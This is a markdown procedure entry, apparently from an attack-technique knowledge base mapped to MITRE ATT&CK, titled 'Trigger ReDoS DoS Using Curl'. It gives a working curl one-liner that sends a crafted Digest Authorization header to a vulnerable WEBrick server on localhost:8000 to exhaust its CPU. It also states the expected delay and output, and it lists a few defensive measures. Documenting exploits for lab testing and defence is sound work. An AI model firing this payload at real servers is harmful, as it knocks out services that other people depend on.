---
id: proc-trigger-redos-curl
tags:
  - redos
  - dos
  - curl
  - exploit
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/time]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-exploit-webrick-redos]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:31:19.596Z'
sub_techniques:
  - '[[OS Exhaustion Flood]]'
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
---
# Trigger ReDoS DoS Using Curl

## Summary

This procedure sends a crafted HTTP request to a vulnerable WEBrick server using curl, exploiting the ReDoS in DigestAuth to cause denial of service through CPU exhaustion.

## Description

The attack sends a HEAD request with a malicious Authorization header containing the ReDoS payload. Target is a local WEBrick server on port 8000. Expected outcome is a delayed response (seconds) and 100% CPU usage, demonstrating DoS impact.

## Requirements

1. Running vulnerable WEBrick server on localhost:8000
2. curl and time utilities installed
3. Crafted payload from prior procedure

## Defense

Defensive measures and detection strategies:

- Patch WEBrick to fixed version (Ruby 2.6+ or manual regex fix)
- Implement request timeouts for auth processing
- Monitor for anomalous CPU during HTTP requests and block suspicious IPs

## Objectives

1. Deliver ReDoS payload via HTTP
2. Measure and confirm DoS effect
3. Validate vulnerability exploitation

## Instructions

### Step 1: Prepare Command

**Context**: Use time to measure the impact of the curl request.

Execute [[commands/curl-exploit-webrick-redos]]:

```bash
time curl -I --header 'Authorization: Digest a="\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b' http://localhost:8000
```

> The -I flag performs HEAD, --header adds the payload. Expect ~9s real time for response.

### Step 2: Analyze Output

**Context**: Verify delay and server response.

Check for HTTP/1.1 400 Bad Request after delay, with timing output showing high real time.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques

- [[OS Exhaustion Flood]]

## Commands Used

- [[commands/curl-exploit-webrick-redos]]

## Tools Used

- [[tools/curl]]
- [[tools/time]]

## Tags

- redos
- dos
- exploit
